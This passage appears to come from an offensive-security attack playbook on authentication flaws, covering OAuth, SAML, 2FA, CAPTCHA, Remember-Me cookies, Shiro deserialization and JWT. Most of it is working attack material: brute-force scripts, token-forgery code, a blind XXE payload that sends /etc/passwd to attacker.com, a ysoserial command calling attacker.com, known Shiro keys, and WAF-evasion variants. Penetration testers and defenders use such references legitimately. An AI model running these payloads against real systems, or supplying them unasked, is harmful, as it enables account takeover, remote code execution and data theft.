# If the Token is a 6-digit number:
for i in range(0, 1000000):
    token = f"{i:06d}"
    if try_token(token):
        print(f"[+] Valid token: {token}")
        break
```

---

### OAuth vulnerabilities  `auth-oauth`
OAuth authentication-flow vulnerabilities
Sub-category: **OAuth** · tags: `auth` `oauth` `redirect`

**Prerequisites:** OAuth login is used

**Attack chain:**

**1. CSRF attack**
_Missing state parameter_
```
# OAuth CSRF - forced account-binding attack:
# 1. Obtain the attacker's OAuth authorization code:
#    Go through the normal OAuth flow to the callback but do not complete it
#    Intercept: http://target.com/callback?code=ATTACKER_CODE

# 2. Construct a CSRF page:
<html>
  <body>
    <img src="http://target.com/callback?code=ATTACKER_CODE">
    <!-- Or use an iframe -->
    <iframe src="http://target.com/callback?code=ATTACKER_CODE" style="display:none"></iframe>
  </body>
</html>

# 3. After the victim visits this page, their account gets bound to the attacker's OAuth account
# 4. The attacker can log into the victim's account via OAuth

# Defense detection: check whether the authorization request carries a state parameter
```

**2. Redirect URI**
_Redirect to the attacker to obtain the Code_
```
redirect_uri=http://attacker.com
```

**3. OAuth State-parameter missing/predictable CSRF**
_Detect the missing or predictable state parameter in the OAuth flow_
```
# 1. Detect whether the state parameter exists:
# Access the OAuth authorization URL and check whether it has a state parameter
curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code"

# 2. If there is no state parameter → CSRF binding attack:
# The attacker initiates authorization with their own OAuth account and obtains a code
# Construct link: http://target.com/callback?code=ATTACKER_CODE
# Send it to the victim → the victim's account gets bound to the attacker's OAuth account

# 3. If state is predictable:
# Request multiple times to obtain state values and analyze the pattern
for i in $(seq 1 5); do
  state=$(curl -sI "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code" | grep -i "location" | grep -oP "state=([^&]+)" | cut -d= -f2)
  echo "State $i: $state"
  sleep 0.5
done
```

**4. Token theft and scope escalation**
_OAuth Token theft, scope escalation, and cross-application Token reuse testing_
```
# 1. Leak the Token via redirect_uri:
# In the implicit flow the Token is in the URL fragment:
# http://attacker.com/callback#access_token=xxx
# Leak via Referer:
# If the callback page has an external link, the Token leaks via the Referer

# 2. Scope escalation - request higher privileges:
curl "http://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://target.com/callback&response_type=code&scope=admin+write+delete"

# 3. Token-reuse test - use the Token exchanged from an authorization_code to access other APIs:
TOKEN="stolen_access_token_here"
curl -H "Authorization: Bearer ${TOKEN}" "http://target.com/api/admin/users"
curl -H "Authorization: Bearer ${TOKEN}" "http://target.com/api/admin/settings"
curl -H "Authorization: Bearer ${TOKEN}" "http://other-app.target.com/api/user/info"

# 4. Infinite renewal after refresh_token theft:
curl -d "grant_type=refresh_token&refresh_token=STOLEN_REFRESH_TOKEN&client_id=xxx"   "http://target.com/oauth/token"
```

**WAF/EDR bypass variants:**

**1. Redirect-URI bypass technique collection**
_Multiple redirect_uri allowlist-bypass techniques_
```
# Allowlist-bypass techniques:

# 1. Subdomain bypass (if the allowlist uses suffix matching):
redirect_uri=http://evil.target.com/callback
redirect_uri=http://target.com.evil.com/callback

# 2. Path traversal:
redirect_uri=http://target.com/callback/../../../evil-page
redirect_uri=http://target.com/callback/..%2f..%2f..%2fevil-page

# 3. Parameter injection:
redirect_uri=http://target.com/callback?next=http://evil.com
redirect_uri=http://target.com/callback%23@evil.com

# 4. Port injection:
redirect_uri=http://target.com:8080@evil.com/callback

# 5. URL-encoding bypass:
redirect_uri=http://target.com%40evil.com/callback
redirect_uri=http://target.com%2540evil.com/callback

# 6. localhost/intranet bypass:
redirect_uri=http://127.0.0.1/callback
redirect_uri=http://[::1]/callback

# 7. Open-redirect chain:
redirect_uri=http://target.com/redirect?url=http://evil.com
```

---

### SAML vulnerabilities  `auth-saml`
SAML assertion attacks
Sub-category: **SAML** · tags: `auth` `saml` `xml`

**Prerequisites:** SAML SSO is used

**Attack chain:**

**1. XML signature bypass**
_SAML Raider tool_
```
# SAML assertion tampering - remove signature validation:
# 1. Intercept the SAML Response (Burp Suite):
# The SAMLResponse parameter in POST /saml/acs

# 2. Base64 decode:
echo "SAML_RESPONSE_BASE64" | base64 -d > saml.xml

# 3. Modify the NameID in the assertion (escalate to admin):
# Original: <NameID>user@target.com</NameID>
# Modified: <NameID>admin@target.com</NameID>

# 4. Remove the signature block (delete the entire <Signature>...</Signature>):
xmlstarlet ed -d "//*[local-name()='Signature']" saml.xml > saml_modified.xml

# 5. Re-Base64-encode and replace:
base64 -w0 saml_modified.xml | xclip -sel clip

# 6. In Burp, replace the SAMLResponse parameter with the modified value
```

**2. XXE attack**
_SAML is based on XML_
```
# SAML XXE injection attack:
# 1. After decoding the SAML Response, inject a DTD after the XML declaration:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response ...>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>

# 2. Out-of-band data exfiltration (Blind XXE):
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

# evil.dtd content:
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % payload "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
%payload;

# 3. Base64-encode and replace the SAMLResponse parameter to send
```

**3. SAML Response tampering and replay**  _[linux]_
_SAML Response identity-information tampering and replay attack_
```
# 1. Intercept the SAML Response:
# In Burp Suite, intercept the POST to /saml/acs
# The SAMLResponse parameter is Base64-encoded XML

# 2. Decode and modify:
echo "BASE64_SAML_RESPONSE" | base64 -d > saml_resp.xml

# 3. Modify key fields:
# - NameID: change to the target user (admin@target.com)
# - Audience: ensure it matches the SP
# - Conditions/NotBefore/NotOnOrAfter: ensure the time is valid

# Modify with xmlstarlet:
xmlstarlet ed -N saml="urn:oasis:names:tc:SAML:2.0:assertion"   -u "//saml:NameID" -v "admin@target.com" saml_resp.xml > modified.xml

# 4. Re-encode and submit:
cat modified.xml | base64 -w0 > encoded.txt
curl -d "SAMLResponse=$(cat encoded.txt)&RelayState=/" "http://target.com/saml/acs"

# 5. Replay attack (if InResponseTo/time is not checked):
# Directly replay a previously captured valid SAMLResponse
curl -d "SAMLResponse=PREVIOUSLY_CAPTURED&RelayState=/" "http://target.com/saml/acs"
```

**4. Advanced SAML signature-bypass techniques**  _[linux]_
_Multiple advanced SAML signature-bypass techniques_
```
# 1. Signature Wrapping attack (XSW - XML Signature Wrapping):
# Move the signed assertion to another location in the XML and inject a malicious assertion
# There are 8 XSW attack variants

# Use SAML Raider (Burp plugin):
# - Intercept the SAMLResponse
# - Choose the XSW attack type (1-8)
# - Modify the NameID to admin
# - Replay

# 2. Signature exclusion (if the SP does not verify the signature):
# Delete the entire <ds:Signature> node from the XML
xmlstarlet ed -N ds="http://www.w3.org/2000/09/xmldsig#"   -d "//ds:Signature" saml_resp.xml > no_sig.xml

# 3. Self-signed certificate substitution:
# Generate a self-signed certificate:
openssl req -new -x509 -days 365 -nodes -newkey rsa:2048   -keyout my.key -out my.crt -subj "/CN=Evil IDP"

# Sign with xmlsec1:
xmlsec1 --sign --privkey-pem my.key --id-attr:ID Assertion saml_resp.xml

# 4. Comment-injection bypass:
# admin<!-- -->@target.com may be parsed as admin@target.com
# Inject in the NameID: admin@target.com<!---->.evil.com
```

**WAF/EDR bypass variants:**

**1. SAML XML obfuscation to bypass the WAF**  _[linux]_
_XML encoding obfuscation and multiple format variants to bypass the WAF's SAML detection_
```
# 1. XML encoding obfuscation:
# Wrap the payload in a CDATA section:
<NameID><![CDATA[admin@target.com]]></NameID>

# 2. DTD-defined entity:
<!DOCTYPE foo [<!ENTITY user "admin@target.com">]>
<NameID>&user;</NameID>

# 3. XML namespace obfuscation:
<saml:NameID xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
             xmlns:x="http://evil.com">admin@target.com</saml:NameID>

# 4. Different ways to encode the SAMLResponse:
# Standard Base64:
cat saml.xml | base64 -w0
# Base64 with newlines:
cat saml.xml | base64
# URL-encoded Base64:
cat saml.xml | base64 -w0 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"

# 5. Deflate+Base64 (some implementations accept it):
python3 -c "import zlib,base64; print(base64.b64encode(zlib.compress(open('saml.xml','rb').read())).decode())"
```

---

### 2FA bypass  `auth-2fa`
Bypass two-factor authentication
Sub-category: **2FA** · tags: `auth` `2fa` `mfa`

**Prerequisites:** 2FA is enabled

**Attack chain:**

**1. Direct access**
_Forced browsing to bypass the 2FA page_
```
# 2FA bypass - forced browsing (directly skip the verification step):
# 1. Normally log in with username and password, reaching the 2FA verification page
# 2. Without entering the code, directly access backend pages:
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/admin/dashboard" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/api/user/profile" -v
curl -b "session=LOGIN_SESSION_COOKIE" "http://target.com/home" -v

# 3. Modify the frontend JS to skip verification:
# Execute in the browser Console:
# window.location = '/dashboard'

# 4. Modify the verification status in the response:
# Burp intercept the response: {"2fa_required":true} → {"2fa_required":false}

# 5. Directly call the API (may not check the 2FA status):
curl -b "session=COOKIE" "http://target.com/api/v1/users" -v
```

**2. Code brute force**
_No rate limit_
```
# 2FA code brute force:
# 1. TOTP is usually a 6-digit number (000000-999999):
# But there is a 30-second time window, requiring extremely fast brute forcing

# 2. SMS-code brute force (4 digits):
# Burp Intruder:
POST /verify-2fa HTTP/1.1
Content-Type: application/json

{"otp":"§0000§","session":"LOGIN_SESSION"}
# Payload: Numbers 0000-9999

# 3. Detect the rate limit:
# Rapidly send 10 requests and observe whether it is limited
for i in $(seq 1000 1010); do
  curl -s -o /dev/null -w "%{http_code}" \
    -d "otp=$i&session=SESS" "http://target.com/verify-2fa"
  echo " - $i"
done

# 4. Bypass the rate limit:
# X-Forwarded-For IP rotation
# Modify the User-Agent
# Add a null byte: otp=1234%00
```

**3. Logic bypass**
_Modify the response packet_
```
response=true / success=1
```

**WAF/EDR bypass variants:**

**1. Response tampering and direct endpoint access**
_Trick the frontend into believing verification passed by intercepting and modifying the 2FA verification response, or bypass the 2FA page and directly access protected endpoints to test whether the server enforces the 2FA status_
```
# Response tampering (Burp intercept):
# Original response: {"success":false,"message":"Invalid OTP"}
# Modify to:         {"success":true,"message":"Valid OTP"}

# Directly skip the 2FA step:
# After login, do not access /verify-2fa; directly access:
GET /dashboard HTTP/1.1
Cookie: session=AFTER_LOGIN_SESSION

# Modify the status parameter:
POST /verify-2fa
{"otp":"000000","skip":true}
/verify-2fa?verified=true
```

**2. Backup-code brute force and verification race condition**
_Dictionary-brute-force the 2FA backup recovery codes (usually less strictly limited than OTP), and use a race condition to concurrently send multiple OTP verification requests to bypass the rate limit_
```
# Backup-code brute force (usually 8-digit numbers/letters):
# Use Burp Intruder to brute-force the backup_code parameter
POST /verify-backup-code
{"backup_code":"§12345678§"}
# Check the rate limit and lockout policy

# Race Condition:
# Send multiple verification requests simultaneously:
for i in $(seq 000000 000100); do
  curl -s -X POST "http://target.com/verify-2fa"     -b "session=SID" -d "otp=$i" &
done
wait
# Multi-threaded concurrency may bypass the rate limit
```

---

### CAPTCHA bypass  `auth-captcha`
Bypass the graphical CAPTCHA
Sub-category: **CAPTCHA** · tags: `auth` `captcha` `bypass`

**Prerequisites:** a CAPTCHA exists

**Attack chain:**

**1. Reuse**
_The CAPTCHA is not invalidated after one use_
```
# CAPTCHA replay attack (verify once, use multiple times):
# 1. Normally obtain and enter the correct CAPTCHA
# 2. In Burp, capture the successful request
# 3. Send the request to Repeater and resend repeatedly:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=§test§&captcha=VALID_CAPTCHA

# 4. If each response is normal (not "CAPTCHA incorrect")
#    it means the CAPTCHA is not invalidated after use, usable for brute forcing

# 5. Combine with Intruder for password brute force:
# Positions: password field
# Payloads: password dictionary
# Fix the captcha field to a known valid value

# Burp Intruder setup: Sniper mode, Payload is the password list
```

**2. Empty-value bypass**
_Leave the CAPTCHA parameter empty_
```
# CAPTCHA empty-value / parameter-deletion bypass:
# 1. Submit an empty CAPTCHA:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=

# 2. Submit a null value:
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test","captcha":null}

# 3. Completely delete the captcha parameter:
POST /login HTTP/1.1

username=admin&password=test

# 4. Submit special values:
captcha=0
captcha=undefined
captcha[]=
captcha=true

# 5. Different encodings:
captcha=%00
captcha=%20

# If login succeeds via any of these, the CAPTCHA validation can be bypassed
```

**3. Delete the parameter**
_The backend does not check parameter presence_
```
# CAPTCHA parameter-removal bypass:
# 1. Original request (with CAPTCHA):
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test&captcha=abcd

# 2. In Burp Repeater, delete the captcha parameter:
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=test

# 3. Modify the Content-Type to test (may go through different processing logic):
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 4. Via the mobile API (may have no CAPTCHA):
POST /api/mobile/login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":"test"}

# 5. Old-version API (may have no CAPTCHA):
POST /api/v1/login HTTP/1.1
```

**WAF/EDR bypass variants:**

**1. Session reuse and parameter-removal bypass**
_Test whether the CAPTCHA is immediately invalidated after use (reusable), delete the captcha parameter to check whether the backend enforces validation, or pass empty values, arrays, and other abnormal types to bypass the type check_
```
# Session reuse (CAPTCHA not invalidated after one use):
# 1. Enter the CAPTCHA correctly once
# 2. Subsequent requests keep using the same captcha value
# Burp Repeater replays the same captcha parameter

# Delete the captcha parameter:
# Original: user=admin&pass=123&captcha=ABCD
# Modified: user=admin&pass=123
# The backend may not validate the missing parameter

# Empty-value bypass:
captcha=
captcha=null
captcha=undefined
captcha[]=
```

**2. OCR recognition and audio-CAPTCHA exploitation**
_Use an OCR tool (Tesseract) to automatically recognize a simple graphical CAPTCHA, use the audio-CAPTCHA speech-recognition alternative, or check whether the response directly leaks the CAPTCHA value_
```
# OCR automatic recognition of a graphical CAPTCHA:
# Python + Tesseract:
import pytesseract
from PIL import Image
img = Image.open("captcha.png")
text = pytesseract.image_to_string(img)
print(text)

# Audio-CAPTCHA exploitation:
# Use the Google Speech-to-Text API to recognize the audio CAPTCHA
# Or use Selenium to automatically obtain it + speech recognition

# CAPTCHA response leak:
# Check whether the response headers, Cookie, or hidden fields contain the CAPTCHA value
curl -v "http://target.com/captcha/generate" 2>&1 | grep -iE "captcha|code|verify"
```

---

### Remember-me vulnerability  `auth-remember-me`
Remember-Me feature vulnerability
Sub-category: **session management** · tags: `auth` `remember-me` `cookie`

**Prerequisites:** Remember-Me is enabled

**Attack chain:**

**1. Cookie forgery**
_Plaintext-stored username_
```
# Remember-Me Cookie forgery:
# 1. Analyze the Cookie structure:
# Common formats: username|timestamp|hash or base64(username:expiry:hash)
Cookie: remember=admin
Cookie: remember=dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0

# 2. Base64 decode and analyze:
echo "dXNlcjoxNjk5MDAwMDAwOmFiY2QxMjM0" | base64 -d
# Output: user:1699000000:abcd1234

# 3. Forge admin's Cookie:
echo -n "admin:1999999999:abcd1234" | base64
# Replace the Cookie with the generated value

# 4. If a weak Hash is used (e.g. MD5(username+secret)):
# Register a new account → analyze the Cookie → derive the secret → forge admin's Cookie

# 5. Test:
curl -b "remember=FORGED_VALUE" "http://target.com/dashboard" -v
```

**2. Base64 decoding**
_Weak encryption or encoding_
```
# Remember-Me Cookie decoding and analysis:
# 1. Extract the Cookie value:
curl -c cookies.txt -d "username=testuser&password=test123&remember=1" "http://target.com/login"
cat cookies.txt | grep -i remember

# 2. Base64 decode:
echo "COOKIE_VALUE" | base64 -d

# 3. If it is URL-encoded + Base64:
python3 -c "import urllib.parse,base64; print(base64.b64decode(urllib.parse.unquote('COOKIE_VALUE')))"

# 4. Try Hex decoding:
echo "COOKIE_VALUE" | xxd -r -p

# 5. Analyze the decoded structure:
# username:timestamp:hmac
# {"user":"admin","exp":1699999999}
# serialized object (Java/PHP)

# 6. Check whether it is a known framework's Cookie format:
# Shiro: AES-CBC encryption (default key kPH+bIxk5D2deZiIxcaaaA==)
# Django: base64(payload):timestamp:signature
```

**3. Remember-password Token reverse analysis**  _[linux]_
_Reverse-analyze the generation logic of the remember-me Token_
```
# 1. Collect multiple remember-me Tokens:
for i in $(seq 1 5); do
  token=$(curl -s -c - -d "username=testuser&password=testpass&remember=1"     "http://target.com/login" | grep -i "remember" | awk '{print $NF}')
  echo "Token $i: $token"
  sleep 1
done

# 2. Base64 decode and analyze:
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -20

# 3. Check common formats:
# username:timestamp:hash
# username:md5(password)
# serialized_object (Java: rO0AB... PHP: O:4:...)

# 4. If it is Java serialization (Shiro RememberMe):
echo "REMEMBER_TOKEN" | base64 -d | xxd | head -3
# If it starts with aced0005 → a Java serialized object
# If the Token is encrypted: try the Shiro default key kPH+bIxk5D2deZiIxcaaaA==

# 5. PHP deserialization check:
echo "REMEMBER_TOKEN" | base64 -d
# If it looks like O:4:"User":2:{s:4:"name";s:5:"admin";...} → PHP serialization
```

**4. Shiro RememberMe deserialization RCE**
_Use the Shiro default key + a deserialization chain to achieve RCE_
```
# Apache Shiro framework's RememberMe Cookie deserialization vulnerability
# Principle: AES-CBC encryption (default key) → Base64 encoding → Cookie

# 1. Detect the Shiro framework:
curl -sI "http://target.com/" | grep -i "rememberMe=deleteMe"
# Send an invalid Cookie to trigger the characteristic response:
curl -sI "http://target.com/" -b "rememberMe=test" | grep -i "rememberMe"

# 2. Test the list of known Shiro keys:
# kPH+bIxk5D2deZiIxcaaaA==
# 2AvVhdsgUs0FSA3SDFAdag==
# 3AvVhmFLUs0KTA3Kprsdag==
# ...

# 3. Use the ShiroExploit tool:
# java -jar ShiroExploit.jar http://target.com

# 4. Manually construct the payload (requires ysoserial):
java -jar ysoserial.jar CommonsCollections2 "curl http://attacker.com/rce" > payload.ser

# AES encryption:
python3 -c "
import base64
from Crypto.Cipher import AES
import os

key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')
iv = os.urandom(16)
payload = open('payload.ser','rb').read()
# PKCS5Padding
pad = 16 - len(payload) % 16
payload += bytes([pad]) * pad
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = iv + cipher.encrypt(payload)
print(base64.b64encode(encrypted).decode())
"
```

**WAF/EDR bypass variants:**

**1. Remember-Me Cookie bypass detection**
_Enumerate Shiro keys and different encryption modes to bypass detection_
```
# 1. Modify the Cookie name casing:
curl -b "RememberMe=payload" "http://target.com/"
curl -b "rememberme=payload" "http://target.com/"
curl -b "REMEMBERME=payload" "http://target.com/"

# 2. Shiro key enumeration (encrypt the payload with different keys):
import base64, itertools
from Crypto.Cipher import AES
import os

keys = [
    "kPH+bIxk5D2deZiIxcaaaA==",
    "2AvVhdsgUs0FSA3SDFAdag==",
    "3AvVhmFLUs0KTA3Kprsdag==",
    "4AvVhmFLUs0KTA3Kprsdag==",
    "Z3VucwAAAAAAAAAAAAAAAA==",
    "wGiHplamyXlVB11UXWol8g==",
    "fCq+/xW488hMTCD+cmJ3aQ==",
]

payload = open("payload.ser", "rb").read()
for k in keys:
    try:
        key = base64.b64decode(k)
        iv = os.urandom(16)
        pad = 16 - len(payload) % 16
        padded = payload + bytes([pad]) * pad
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc = base64.b64encode(iv + cipher.encrypt(padded)).decode()
        print(f"Key: {k} → Cookie length: {len(enc)}")
    except Exception as e:
        print(f"Key: {k} → Error: {e}")

# 3. GCM mode (Shiro 1.4.2+):
# Newer Shiro uses AES-GCM, requiring the corresponding encryption method
```

---

### JWT authentication vulnerability  `auth-jwt`
Use flaws in the JWT (JSON Web Token) implementation to forge or tamper with authentication tokens, achieving unauthorized access or privilege escalation
Sub-category: **JWT** · tags: `auth` `jwt` `token`

**Prerequisites:** the target uses JWT for authentication; you can obtain or intercept the JWT token; the JWT library has a known vulnerability or the server is misconfigured

**Attack chain:**

**1. JWT decoding and analysis**
_Decode the JWT Header and Payload to analyze its structure and privilege information_
```
# Manually decode the JWT (Base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d. -f2 | base64 -d 2>/dev/null

# Use jwt_tool to decode:
python3 jwt_tool.py <token>

# Online decode:
# https://jwt.io/

# Check key fields:
# - alg: signature algorithm (HS256/RS256/none)
# - kid: key ID (may be injectable)
# - typ: token type
# - exp: expiration time
# - role/admin/isAdmin: privilege fields
```

**2. Algorithm None attack**
_Set the JWT alg field to none so the server skips signature validation and directly accepts the tampered payload_
```
# Change alg to none to bypass signature validation
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin", "iat": 1700000000, "exp": 1999999999}

h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")

# Multiple variant bypasses:
alg_variants = ["none", "None", "NONE", "nOnE"]
for alg in alg_variants:
    header["alg"] = alg
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
    token = h.decode() + "." + p.decode() + "."
    print(f"alg={alg}: {token}")

# Use jwt_tool:
python3 jwt_tool.py <token> -X a  # Algorithm None attack
```

**3. HS256 key brute force**  _[linux]_
_Dictionary-brute-force the key of a JWT using HS256 symmetric encryption_
```
# Use jwt_tool to brute-force a weak key
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# Use hashcat:
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# Use john:
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Common weak keys:
# secret, password, 123456, admin, key, test
# company name, project name, domain name, etc.

# After confirming the key, forge the JWT:
import jwt
token = jwt.encode({"user":"admin","role":"admin"}, "found_secret", algorithm="HS256")
print(token)
```

**4. RS256→HS256 algorithm-confusion attack**  _[linux]_
_Use RS256/HS256 algorithm confusion, signing a forged JWT with the public key as the HS256 symmetric key_
```
# When the server uses RS256 but accepts HS256:
# 1. Obtain the server's public key (usually at /.well-known/jwks.json or /api/keys)
curl -s "http://target.com/.well-known/jwks.json"
curl -s "http://target.com/api/v1/keys"

# 2. Extract the public key
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem

# 3. Sign the JWT using the public key as the HS256 key
import jwt
public_key = open("pubkey.pem").read()
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
print(token)

# Use jwt_tool:
python3 jwt_tool.py <token> -X k -pk pubkey.pem  # Key confusion attack
```

**5. KID parameter injection**
_Use SQL injection or path traversal in the JWT header's kid field to control the signature-verification key_
```
# KID (Key ID) SQL injection:
# Original header: {"alg":"HS256","kid":"key1"}
# Injected header: {"alg":"HS256","kid":"key1' UNION SELECT 'ATTACKER_SECRET' -- "}

import jwt, json, base64

# SQL-injection method:
header = {"alg": "HS256", "kid": "x' UNION SELECT 'test' -- "}
token = jwt.encode({"user": "admin"}, "test", algorithm="HS256", headers=header)

# Path-traversal method:
header2 = {"alg": "HS256", "kid": "../../dev/null"}
# /dev/null content is empty, the key is an empty string
token2 = jwt.encode({"user": "admin"}, "", algorithm="HS256", headers=header2)

# Use jwt_tool:
python3 jwt_tool.py <token> -X i -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

**WAF/EDR bypass variants:**

**1. JWK/JKU header key injection**
_Embed the attacker's public key via the jwk field in the JWT Header, or point the jku field to the attacker's JWKS endpoint, making the server validate the signature with an attacker-controlled key_
```
# JWK embedded-key injection:
# Generate an RSA key pair:
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# Construct the JWT Header:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"<attacker_n_base64>","e":"AQAB","use":"sig"}}
# Sign with attacker.key; the server takes the public key from the jwk field to validate

# JKU remote-key injection:
{"alg":"RS256","jku":"http://attacker.com/jwks.json"}
# Deploy a JWKS file containing the attacker's public key on attacker.com

# Use jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
```

**2. Algorithm downgrade and nested-token exploitation**
_Use the RS256-to-HS256 algorithm-confusion attack (signing with the public key as the symmetric key), or embed a forged internal JWT token in the JWT Payload to trigger a recursive-parsing vulnerability_
```
# Algorithm downgrade (RS256→HS256):
# After obtaining the server's public key, use it as the HS256 key:
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pub.pem
python3 -c "
import jwt
pub = open('pub.pem').read()
token = jwt.encode({'user':'admin','role':'admin'}, pub, algorithm='HS256')
print(token)"

# Claim tampering + nested JWT:
# Embed another JWT in the JWT payload:
{"user":"admin","inner_token":"<another forged JWT>"}
# Some systems recursively parse inner_token
```

---

### · JWT security

### JWT None-algorithm attack  `jwt-none-attack`
Exploit the JWT library's flawed support for the "none" algorithm: change the JWT header's signature algorithm to none, then remove the signature part, constructing a forged token that passes validation without a key. This is one of the most classic JWT vulnerabilities.
Sub-category: **algorithm attack** · tags: `JWT` `none algorithm` `authentication bypass` `token forgery` `CVE-2015-2951`

**Prerequisites:** the target uses JWT for identity authentication; jwt_tool or the Python PyJWT library

**Attack chain:**

**1. 1. Decode an existing JWT**
_Parse the JWT's Header and Payload parts, identifying the algorithm and claim content_
```
# Decode the three parts of the JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f1 | base64 -d
# Output: {"alg":"HS256","typ":"JWT"}

echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f2 | base64 -d
# Output: {"user":"guest","role":"user"}
```

**2. 2. Construct a None-algorithm JWT**
_A Python script constructs a forged JWT with alg=none, escalating to admin_
```
import base64, json

# Change the Header to the none algorithm
header = base64.urlsafe_b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).rstrip(b"=").decode()

# Change the Payload to admin
payload = base64.urlsafe_b64encode(
    json.dumps({"user":"admin","role":"admin"}).encode()
).rstrip(b"=").decode()

# Empty signature
forged_jwt = f"{header}.{payload}."
print(forged_jwt)
```

**3. 3. jwt_tool automated attack**
_Use jwt_tool to automatically test the none algorithm and its casing variants_
```
python3 jwt_tool.py {TOKEN} -X a

# -X a = try the none-algorithm attack
# Simultaneously tests multiple none variants
# none, None, NONE, nOnE, noNe
```

**4. 4. Verify the forged token**
_Use the forged JWT to access the admin endpoint and verify the attack effect_
```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/dashboard"

# Check whether admin privileges were obtained
# 200 OK = attack succeeded
# 401/403 = the server correctly rejects the none algorithm
```

**WAF/EDR bypass variants:**

**1. none-algorithm casing variants**
_Use various casing combinations of none and different signature placeholders to bypass validation_
```
# Various none variants
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":"noNe"}
{"alg":"nONE"}

# Add a signature placeholder
header.payload.
header.payload.AA==
header.payload.e30=
```

---

### JWT key-confusion attack (RS→HS)  `jwt-key-confusion`
When the server uses an RSA public key to validate the JWT, the attacker changes the algorithm from RS256 to HS256; at that point the server mistakenly uses the RSA public key as the HMAC key for validation. Since the RSA public key is public, the attacker can use it to sign any JWT.
Sub-category: **algorithm attack** · tags: `JWT` `key confusion` `RS256` `HS256` `algorithm tampering`

**Prerequisites:** the target JWT uses the RS256/RS384/RS512 algorithm; the RSA public key has been obtained; jwt_tool or Python

**Attack chain:**

**1. 1. Obtain the RSA public key**
_Obtain the RSA public key from the JWKS endpoint, the API, or the SSL certificate_
```
# Common public-key leak locations
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/api/keys" | jq
curl -s "https://{TARGET}/oauth/discovery" | jq

# Extract the public key from JWKS
# Or obtain it from the SSL certificate
openssl s_client -connect {TARGET}:443 | openssl x509 -pubkey -noout > pubkey.pem
```

**2. 2. Key-confusion attack**
_A Python script signs a forged JWT with the RSA public key as the HMAC key_
```
import jwt
import json

# Read the RSA public key
with open("pubkey.pem", "rb") as f:
    public_key = f.read()

# Sign with the public key as the HMAC key
forged_payload = {
    "user": "admin",
    "role": "admin",
    "iat": 1707811200,
    "exp": 1999999999
}

# Switch the algorithm from RS256 to HS256
forged_token = jwt.encode(
    forged_payload,
    public_key,        # RSA public key as the HMAC key
    algorithm="HS256"  # change to the HMAC algorithm
)
print(forged_token)
```

**3. 3. jwt_tool automated attack**
_jwt_tool executes the key-confusion attack in one step_
```
python3 jwt_tool.py {TOKEN} -X k -pk pubkey.pem

# -X k = key-confusion attack mode
# -pk = specify the public-key file
# The tool automatically completes the RS256→HS256 switch and signing
```

**4. 4. JWKS endpoint injection**
_JKU/X5U header injection makes the server obtain the validation key from an attacker-controlled URL_
```
# If the jku/x5u header is supported, you can inject a custom JWKS endpoint
Header: {
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://evil.com/.well-known/jwks.json"
}

# Host the attacker-generated JWKS on evil.com
